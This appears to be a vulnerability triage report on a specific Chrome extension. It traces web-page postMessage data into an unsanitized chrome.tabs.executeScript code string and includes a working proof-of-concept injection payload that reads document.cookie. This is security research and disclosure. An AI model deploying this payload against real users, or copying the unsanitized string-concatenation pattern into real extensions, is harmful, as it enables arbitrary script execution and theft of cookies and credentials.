# CoCo Analysis: bnkifneleaknlodbdncgnpbdffngdgjo

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 40 (multiple variants of the same vulnerability)

---

## Sink: cs_window_eventListener_message → chrome_tabs_executeScript_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bnkifneleaknlodbdncgnpbdffngdgjo/opgen_generated_files/cs_0.js
Line 487	window.addEventListener("message", function (event) {
Line 491	  if (event.data.type === "check_installation") {
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bnkifneleaknlodbdncgnpbdffngdgjo/opgen_generated_files/bg.js
Line 1103	  this.text = message.text;
Line 1843	        + '";var abExpUrlChangeType = "' + close.text.type

**Code:**

```javascript
// Content script (js/messaging.js) - Entry point
window.addEventListener("message", function (event) {
  if (event.source != window) {
    return;
  }
  if (event.data.type === "check_installation") {
    window.postMessage({type: "plugin_installation", text: chrome.runtime.id}, "*");
  } else {
    chrome.runtime.sendMessage(event.data); // ← attacker-controlled
  }
}, false);

// Background script (background.js) - Message handler
chrome.runtime.onMessage.addListener(function (message, sender, response) {
  var eventhandler = new EventHandler(message, sender, response);
  eventhandler.handle();
});

function EventHandler(message, sender, callback) {
  this.type = message.type;
  this.text = message.text; // ← attacker-controlled
  this.sender = sender;
  this.callback = callback;
}

EventHandler.prototype.handle = function () {
  switch (this.type) {
    case "edit_experiment":
      if (this.text && Object.keys(this.text).length > 0) {
        var json = {}
        json.text = this.text; // ← attacker-controlled
        json.type = this.type;
        // ... navigation logic ...
        updateListener = function (tabId, info) {
          if (info.status === 'complete' && json.tabID == tabId) {
            doAbTest(json); // ← calls vulnerable function
            chrome.tabs.onUpdated.removeListener(updateListener);
          }
        }
        // ...
      }
      break;
  }
};

// js/ab-band.js - Vulnerable sink
doAbTest = function (close) {
  function addslashes( str ) {
    return (str + '').replace(/[\\"']/g, '\\$&').replace(/\u0000/g, '\\0');
  }
  chrome.tabs.insertCSS({file: 'css/loader.css'});
  if (close != null && close != undefined && Object.keys(close).length > 0) {
    if (close.type === "edit_experiment") {
      chrome.tabs.executeScript(close.tabID, {
        code: 'var abExpName = "' + addslashes(close.name)
        + '";var abExpDesc = "' + addslashes(close.desc)
        + '";var abExpUrlChangeType = "' + close.text.type // ← attacker-controlled, no sanitization!
        + '";var abExpId = "' + close.text.experiment_id // ← attacker-controlled, no sanitization!
        + '";var abVariationOriginal = "' + close.text.varOriginal
        + '";var abOrgId = "' + close.text.org_id
        + '";var abNavigate = "' + close.navigate
        + '";var abProjectId = "' + close.text.project_id
        + '";var domainName = "' + close.text.domainName
        + '";var abVariationId = "' + close.text.variation_id
        + '";var abPersonlize = "' + close.text.personalization
        + '";var abVariationName = "' + addslashes(close.text.variation_name)
        + '";var app="' + close.text.app
        + '";'
      });
    }
  }
  // ... more executeScript calls ...
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM event)

**Attack:**

```javascript
// Malicious webpage injects code via postMessage
window.postMessage({
  type: "edit_experiment",
  text: {
    type: '"; alert(document.cookie); var x="',
    experiment_id: "test",
    varOriginal: "test",
    org_id: "test",
    project_id: "test",
    domainName: "test",
    variation_id: "test",
    personalization: "test",
    variation_name: "test",
    app: "test",
    url: "http://example.com"
  }
}, "*");

// The executeScript will construct and execute:
// var abExpUrlChangeType = ""; alert(document.cookie); var x="";
// This executes arbitrary JavaScript in the context of the current tab
```

**Impact:** Arbitrary code execution in any tab where the extension's content script is injected (all URLs based on manifest). An attacker-controlled webpage can send a specially crafted postMessage to inject JavaScript that will be executed via chrome.tabs.executeScript with full tab privileges. This allows the attacker to steal sensitive data (cookies, DOM content, credentials), perform actions on behalf of the user, or modify page content. The `addslashes()` function only sanitizes `close.name`, `close.desc`, and `close.text.variation_name`, but most other properties from `close.text.*` (including `type`, `experiment_id`, `org_id`, `project_id`, `domainName`, `variation_id`, `personalization`, `app`) are directly interpolated into the code string without any sanitization, allowing trivial JavaScript injection.
